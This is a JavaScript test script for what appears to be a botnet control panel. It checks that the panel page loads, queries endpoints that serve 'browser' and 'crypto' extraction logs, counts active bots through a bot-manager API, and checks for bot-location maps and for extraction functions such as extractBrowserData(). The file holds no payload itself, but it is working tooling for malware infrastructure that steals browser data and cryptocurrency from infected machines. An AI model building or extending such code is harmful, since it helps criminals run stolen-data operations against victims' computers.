const fetch = require('node-fetch');

async function testExtractionLogs() {
    console.log(' Testing HTML Panel Extraction Logs Functionality');
    console.log('==================================================');
    
    const baseUrl = 'http://localhost:8080';
    
    try {
        // Test 1: Check if panel loads
        console.log('\n1. Testing Panel Load...');
        const panelResponse = await fetch(`${baseUrl}/advanced-botnet-panel.html`);
        if (panelResponse.ok) {
            console.log(' Panel loads successfully');
        } else {
            console.log(' Panel failed to load');
            return;
        }
        
        // Test 2: Test extraction logs API endpoints
        console.log('\n2. Testing Extraction Logs API...');
        
        // Test browser logs refresh
        try {
            const browserLogsResponse = await fetch(`${baseUrl}/api/extraction-logs/browser`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            console.log(` Browser logs endpoint: ${browserLogsResponse.status}`);
        } catch (error) {
            console.log(` Browser logs endpoint not implemented: ${error.message}`);
        }
        
        // Test crypto logs refresh
        try {
            const cryptoLogsResponse = await fetch(`${baseUrl}/api/extraction-logs/crypto`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            console.log(` Crypto logs endpoint: ${cryptoLogsResponse.status}`);
        } catch (error) {
            console.log(` Crypto logs endpoint not implemented: ${error.message}`);
        }
        
        // Test 3: Test bot integration with extraction
        console.log('\n3. Testing Bot Integration...');
        
        // Test HTTP bot manager
        try {
            const botManagerResponse = await fetch(`${baseUrl}/api/http-bot-manager/bots`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            if (botManagerResponse.ok) {
                const botData = await botManagerResponse.json();
                console.log(` HTTP Bot Manager: ${botData.bots?.length || 0} active bots`);
            }
        } catch (error) {
            console.log(` HTTP Bot Manager: ${error.message}`);
        }
        
        // Test 4: Verify separation between desktop and HTML
        console.log('\n4. Verifying Desktop/HTML Separation...');
        
        // Check that HTML panel doesn't have extraction functionality
        const panelContent = await panelResponse.text();
        
        if (panelContent.includes('extractBrowserData()') || panelContent.includes('extractCryptoData()')) {
            console.log(' HTML panel still contains extraction functions - separation not complete');
        } else {
            console.log(' HTML panel properly separated - no extraction functions found');
        }
        
        if (panelContent.includes('Extraction Logs') && panelContent.includes('log-container')) {
            console.log(' HTML panel has proper logs display functionality');
        } else {
            console.log(' HTML panel missing logs display functionality');
        }
        
        // Test 5: Test geolocation features
        console.log('\n5. Testing Geolocation Features...');
        
        if (panelContent.includes('Bot Locations') && panelContent.includes('country-flag')) {
            console.log(' Geolocation features present in HTML panel');
        } else {
            console.log(' Geolocation features missing from HTML panel');
        }
        
        console.log('\n Extraction logs testing completed!');
        
    } catch (error) {
        console.error(' Test failed:', error.message);
    }
}

// Run the test
testExtractionLogs();
